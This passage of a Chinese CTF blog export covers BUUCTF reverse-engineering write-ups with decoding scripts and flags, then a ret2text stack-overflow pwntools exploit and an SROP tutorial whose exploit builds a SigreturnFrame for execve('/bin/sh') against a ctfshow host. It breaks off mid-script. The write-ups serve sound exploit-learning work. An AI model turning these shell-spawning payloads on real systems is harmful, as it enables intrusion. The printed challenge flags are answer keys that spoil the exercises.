<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;U9X_1S_W6@T?&#125;</span><br></pre></td></tr></table></figure>

<h2 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h2><p>1.发现是apk文件用jadx打开<br>2.还是找到 MainActivity和在IDA中找到main一个意思<br>3.<img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/64.png" alt="64"></p>
<p>4.编个脚本模拟它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char x[]=&quot;dd2940c04462b4dd7c450528835cca15&quot;;</span><br><span class="line">   char a ;</span><br><span class="line">   int i;</span><br><span class="line">   x[2]= x[2]+x[3]-50;</span><br><span class="line">   x[4]=x[2]+x[5]-48;</span><br><span class="line">   x[30]=x[31]+x[9]-48;</span><br><span class="line">   x[14]=x[27]+x[28]-91;</span><br><span class="line">   for(i=0;i&lt;16;i++)&#123;</span><br><span class="line">   	a = x[31-i];</span><br><span class="line">   	x[31 - i] = x[i];</span><br><span class="line">   	x[i] = a;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;flag&#123;%s&#125;&quot;,x);</span><br><span class="line">   return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;59acc538825054c7dk4b26440c0999dd&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><p>1.pyc文件可以用在线pyc的反编译软件<a href="https://www.lddgo.net/string/pyc-compile-decompile">py反编译</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span><br><span class="line"># Version : Python 2.7</span><br><span class="line"></span><br><span class="line">print &#x27;Welcome to Re World!&#x27;  #欢迎</span><br><span class="line">print &#x27;Your input1 is your flag~&#x27;</span><br><span class="line">l = len(input1)     #input1就是flag</span><br><span class="line">for i in range(l):</span><br><span class="line">    num = ((input1[i] + i) % 128 + 128) % 128</span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line">for i in range(l - 1):</span><br><span class="line">    code[i] = code[i] ^ code[i + 1] #进行加密</span><br><span class="line"></span><br><span class="line">print code</span><br><span class="line">code = [</span><br><span class="line">    &#x27;\x1f&#x27;,</span><br><span class="line">    &#x27;\x12&#x27;,</span><br><span class="line">    &#x27;\x1d&#x27;,</span><br><span class="line">    &#x27;(&#x27;,</span><br><span class="line">    &#x27;0&#x27;,</span><br><span class="line">    &#x27;4&#x27;,</span><br><span class="line">    &#x27;\x01&#x27;,</span><br><span class="line">    &#x27;\x06&#x27;,</span><br><span class="line">    &#x27;\x14&#x27;,</span><br><span class="line">    &#x27;4&#x27;,</span><br><span class="line">    &#x27;,&#x27;,</span><br><span class="line">    &#x27;\x1b&#x27;,</span><br><span class="line">    &#x27;U&#x27;,</span><br><span class="line">    &#x27;?&#x27;,</span><br><span class="line">    &#x27;o&#x27;,</span><br><span class="line">    &#x27;6&#x27;,</span><br><span class="line">    &#x27;*&#x27;,</span><br><span class="line">    &#x27;:&#x27;,</span><br><span class="line">    &#x27;\x01&#x27;,</span><br><span class="line">    &#x27;D&#x27;,</span><br><span class="line">    &#x27;;&#x27;,</span><br><span class="line">    &#x27;%&#x27;,</span><br><span class="line">    &#x27;\x13&#x27;]#加密后的结果</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反编译后的结果(加注释后)</p>
<p>2.用脚本进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   int i,j;</span><br><span class="line">   char code[] = &#123;0x1f,0x12,0x1d,&#x27;(&#x27;,&#x27;0&#x27;,&#x27;4&#x27;,0x01,0x06,0x14,&#x27;4&#x27;,&#x27;,&#x27;,0x1b,&#x27;U&#x27;,&#x27;?&#x27;,&#x27;o&#x27;,&#x27;6&#x27;,&#x27;*&#x27;,&#x27;:&#x27;,0x01,&#x27;D&#x27;,&#x27;;&#x27;,&#x27;%&#x27;,0x13&#125;;</span><br><span class="line">   int lenght=strlen(code)-1;</span><br><span class="line">   	char input1[strlen(code)];</span><br><span class="line">   	char num[strlen(code)];</span><br><span class="line">   for(i=lenght-1;i&gt;=0;i--)&#123;</span><br><span class="line">   	code[i] = code[i] ^ code[i + 1];</span><br><span class="line">   &#125;</span><br><span class="line">   for(i=lenght;i&gt;=0;i--)&#123;</span><br><span class="line">    num[i]= code[i];</span><br><span class="line">    for(j=0;j&lt;10;j++)&#123;</span><br><span class="line">    input1[i]=num[i]-i+128*j;</span><br><span class="line">    if(input1[i]&gt;=0&amp;&amp;input1[i]&lt;=128)&#123;</span><br><span class="line">    	break;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%s\n&quot;,input1);</span><br><span class="line">   return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Just_Re_1s_Ha66y!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h2><p>1.apk文件，跟前面的apk题一样找到主要函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.example.findit;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.support.v7.app.ActionBarActivity;</span><br><span class="line">import android.view.MenuItem;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.Button;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.TextView;</span><br><span class="line"></span><br><span class="line">/* loaded from: classes.dex */</span><br><span class="line">public class MainActivity extends ActionBarActivity &#123;</span><br><span class="line">    /* JADX INFO: Access modifiers changed from: protected */</span><br><span class="line">    @Override // android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span><br><span class="line">    public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button btn = (Button) findViewById(R.id.widget3);</span><br><span class="line">        final EditText edit = (EditText) findViewById(R.id.widget2);</span><br><span class="line">        final TextView text = (TextView) findViewById(R.id.widget1);</span><br><span class="line">        final char[] a = &#123;&#x27;T&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;I&#x27;, &#x27;s&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;H&#x27;, &#x27;o&#x27;, &#x27;m&#x27;, &#x27;e&#x27;&#125;;</span><br><span class="line">        final char[] b = &#123;&#x27;p&#x27;, &#x27;v&#x27;, &#x27;k&#x27;, &#x27;q&#x27;, &#x27;&#123;&#x27;, &#x27;m&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;2&#x27;, &#x27;6&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;4&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;9&#x27;, &#x27;l&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;7&#x27;, &#x27;p&#x27;, &#x27;9&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;2&#x27;, &#x27;8&#x27;, &#x27;k&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;&#125;&#x27;&#125;;</span><br><span class="line">        btn.setOnClickListener(new View.OnClickListener() &#123; // from class: com.example.findit.MainActivity.1</span><br><span class="line">            @Override // android.view.View.OnClickListener</span><br><span class="line">            public void onClick(View v) &#123;</span><br><span class="line">                char[] x = new char[17];</span><br><span class="line">                char[] y = new char[38];</span><br><span class="line">                for (int i = 0; i &lt; 17; i++) &#123;</span><br><span class="line">                    if ((a[i] &lt; &#x27;I&#x27; &amp;&amp; a[i] &gt;= &#x27;A&#x27;) || (a[i] &lt; &#x27;i&#x27; &amp;&amp; a[i] &gt;= &#x27;a&#x27;)) &#123;</span><br><span class="line">                        x[i] = (char) (a[i] + 18);</span><br><span class="line">                    &#125; else if ((a[i] &gt;= &#x27;A&#x27; &amp;&amp; a[i] &lt;= &#x27;Z&#x27;) || (a[i] &gt;= &#x27;a&#x27; &amp;&amp; a[i] &lt;= &#x27;z&#x27;)) &#123;</span><br><span class="line">                        x[i] = (char) (a[i] - &#x27;\b&#x27;);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                String m = String.valueOf(x);</span><br><span class="line">                if (m.equals(edit.getText().toString())) &#123;</span><br><span class="line">                    for (int i2 = 0; i2 &lt; 38; i2++) &#123;</span><br><span class="line">                        if ((b[i2] &gt;= &#x27;A&#x27; &amp;&amp; b[i2] &lt;= &#x27;Z&#x27;) || (b[i2] &gt;= &#x27;a&#x27; &amp;&amp; b[i2] &lt;= &#x27;z&#x27;)) &#123;</span><br><span class="line">                            y[i2] = (char) (b[i2] + 16);</span><br><span class="line">                            if ((y[i2] &gt; &#x27;Z&#x27; &amp;&amp; y[i2] &lt; &#x27;a&#x27;) || y[i2] &gt;= &#x27;z&#x27;) &#123;</span><br><span class="line">                                y[i2] = (char) (y[i2] - 26);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String n = String.valueOf(y);</span><br><span class="line">                    text.setText(n);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override // android.app.Activity</span><br><span class="line">    public boolean onOptionsItemSelected(MenuItem item) &#123;</span><br><span class="line">        int id = item.getItemId();</span><br><span class="line">        if (id == R.id.action_settings) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return super.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.模拟一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char a[] = &#123;&#x27;T&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;I&#x27;, &#x27;s&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;H&#x27;, &#x27;o&#x27;, &#x27;m&#x27;, &#x27;e&#x27;&#125;;</span><br><span class="line">   char b[] = &#123;&#x27;p&#x27;, &#x27;v&#x27;, &#x27;k&#x27;, &#x27;q&#x27;, &#x27;&#123;&#x27;, &#x27;m&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;2&#x27;, &#x27;6&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;4&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;9&#x27;, &#x27;l&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;7&#x27;, &#x27;p&#x27;, &#x27;9&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;2&#x27;, &#x27;8&#x27;, &#x27;k&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;&#125;&#x27;&#125;;</span><br><span class="line">   int x[17];</span><br><span class="line">   int y[38];</span><br><span class="line">   int i;</span><br><span class="line">   int i2 ;</span><br><span class="line">   for (i = 0; i &lt; 17; i++) &#123;</span><br><span class="line">                    if ((a[i] &lt; &#x27;I&#x27; &amp;&amp; a[i] &gt;= &#x27;A&#x27;) || (a[i] &lt; &#x27;i&#x27; &amp;&amp; a[i] &gt;= &#x27;a&#x27;)) &#123;</span><br><span class="line">                        x[i] = a[i] + 18;</span><br><span class="line">                    &#125; else if ((a[i] &gt;= &#x27;A&#x27; &amp;&amp; a[i] &lt;= &#x27;Z&#x27;) || (a[i] &gt;= &#x27;a&#x27; &amp;&amp; a[i] &lt;= &#x27;z&#x27;)) &#123;</span><br><span class="line">                        x[i] = a[i] - &#x27;\b&#x27;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">    for (i2 = 0; i2 &lt; 38; i2++) &#123;</span><br><span class="line">                        if ((b[i2] &gt;= &#x27;A&#x27; &amp;&amp; b[i2] &lt;= &#x27;Z&#x27;) || (b[i2] &gt;= &#x27;a&#x27; &amp;&amp; b[i2] &lt;= &#x27;z&#x27;)) &#123;</span><br><span class="line">                            y[i2] = b[i2] + 16;</span><br><span class="line">                            if ((y[i2] &gt; &#x27;Z&#x27; &amp;&amp; y[i2] &lt; &#x27;a&#x27;) || y[i2] &gt;= &#x27;z&#x27;) &#123;</span><br><span class="line">                                y[i2] = y[i2] - 26;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">   for(i = 0; i &lt; 17; i++)&#123;</span><br><span class="line">   	printf(&quot;%c&quot;, (char)x[i]);</span><br><span class="line">   &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    for(i = 0; i &lt; 38; i++)&#123;</span><br><span class="line">    	printf(&quot;%c&quot;, (char)y[i]);</span><br><span class="line">	&#125;</span><br><span class="line">        </span><br><span class="line">   return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>1.就是测试一下你的nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc +靶机地址 （在linxs中ip与端口间没有冒号）</span><br></pre></td></tr></table></figure>

<p>2.pwn题一般都是动态地址，所以每次的flag都是不一样的</p>
<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/49.png" alt="49"></p>
<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>1.先进行一波常规操作<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/50.png" alt="50"></p>
<p>2.再用IDA打开shift+F12直接可以查看后门<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/51.png" alt="51"></p>
<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/52.png" alt="52"></p>
<p>找到后门的地址<br>3.找到main函数<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/53.png" alt="53"></p>
<p>4.我们要考栈溢出一直覆盖到后门(shell)，看看要覆盖多少；<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/54.png" alt="54"></p>
<p>5.在查看system函数的地址<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/55.png" alt="55"></p>
<p>6.构造exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r = process(&quot;./pwn&quot;)</span><br><span class="line">#r=remote(&quot;ip&quot;,端口)</span><br><span class="line">shell=0x0401040</span><br><span class="line">sys=0x00401187</span><br><span class="line">payload=b&#x27;a&#x27;*0x0F+b&#x27;b&#x27;*8+p64(sys)+p64(shell)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/56.png" alt="56"></p>
<p>本地成功换成远程<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/57.png" alt="57"></p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>SROP</title>
    <url>/2025/09/01/SROP/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SROP 是一种高级的漏洞利用技术，它通过篡改内核存储在用户空间栈上的<strong>信号上下文（Signal Context）</strong>，并主动调用一个特殊系统调用 <code>sigreturn()</code>，来让内核无条件地将这片被篡改的上下文恢复到CPU的所有寄存器中，从而实现一种“全能”的攻击效果。</p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki</a>上解释的很清楚，这里我就从这写自己学习的过程，几乎是照搬。</p>
<h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p><img src="/2025/09/01/SROP/1.png" alt="1"></p>
<ol>
<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>
</ol>
<p><img src="/2025/09/01/SROP/2.png" alt="1"></p>
<h3 id="signal-Frame"><a href="#signal-Frame" class="headerlink" title="signal Frame"></a>signal Frame</h3><p>x86</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>x64</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>signal Frame是可读可写的，所以我们可以改动signal Frame来构造恶意的ROP，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p>
<p><img src="/2025/09/01/SROP/3.png" alt="1"></p>
<h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可。</p>
<ul>
<li><strong>控制栈指针。</strong></li>
<li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li>
</ul>
<p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p>
<p><img src="/2025/09/01/SROP/4.png" alt="1"></p>
<h3 id="需要满足的条件"><a href="#需要满足的条件" class="headerlink" title="需要满足的条件"></a>需要满足的条件</h3><ul>
<li><strong>可以通过栈溢出来控制栈的内容</strong></li>
<li>需要知道相应的地址<ul>
<li><strong>“&#x2F;bin&#x2F;sh”</strong></li>
<li><strong>Signal Frame</strong></li>
<li><strong>syscall</strong></li>
<li><strong>sigreturn</strong></li>
</ul>
</li>
</ul>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="ctfshow-pwn86"><a href="#ctfshow-pwn86" class="headerlink" title="ctfshow pwn86"></a>ctfshow pwn86</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v3; // rax</span><br><span class="line">  signed __int64 v4; // rax</span><br><span class="line"></span><br><span class="line">  v3 = sys_write(1u, global_pwn, 0x17uLL);</span><br><span class="line">  if ( (unsigned __int64)sys_read(0, global_buf, 0x200uLL) &gt;= 0xF8 )</span><br><span class="line">    __asm &#123; syscall; LINUX - sys_rt_sigreturn &#125;</span><br><span class="line">  v4 = sys_exit(0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sys_read(0, global_buf, 0x200uLL)就是读入的栈帧(signal frame)</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置上下文信息</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 加载目标二进制文件</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 连接到目标</span></span><br><span class="line">    <span class="comment"># p = process(&#x27;./pwn&#x27;)  # 本地测试</span></span><br><span class="line">    p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28236&quot;</span>)  <span class="comment"># 远程连接</span></span><br><span class="line">    <span class="comment">#elf.sym[&#x27;global_buf&#x27;] = 0x601040</span></span><br><span class="line">    <span class="comment">#elf.sym[&#x27;syscall&#x27;] = 0x400147</span></span><br><span class="line">    <span class="comment"># 定义常量</span></span><br><span class="line">    BIN_SH_OFFSET = <span class="number">0x100</span>  <span class="comment"># &quot;/bin/sh&quot;字符串在缓冲区中的偏移</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造信号返回帧</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = constants.SYS_execve  <span class="comment"># 系统调用号</span></span><br><span class="line">    frame.rdi = elf.sym[<span class="string">&#x27;global_buf&#x27;</span>] + BIN_SH_OFFSET  <span class="comment"># 参数字符串地址</span></span><br><span class="line">    frame.rsi = <span class="number">0</span>  <span class="comment"># argv参数</span></span><br><span class="line">    frame.rdx = <span class="number">0</span>  <span class="comment"># envp参数</span></span><br><span class="line">    frame.rip = elf.sym[<span class="string">&#x27;syscall&#x27;</span>]  <span class="comment"># 返回后执行的指令地址</span></span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">&quot;构造的信号返回帧:&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;RAX = <span class="subst">&#123;frame.rax&#125;</span> 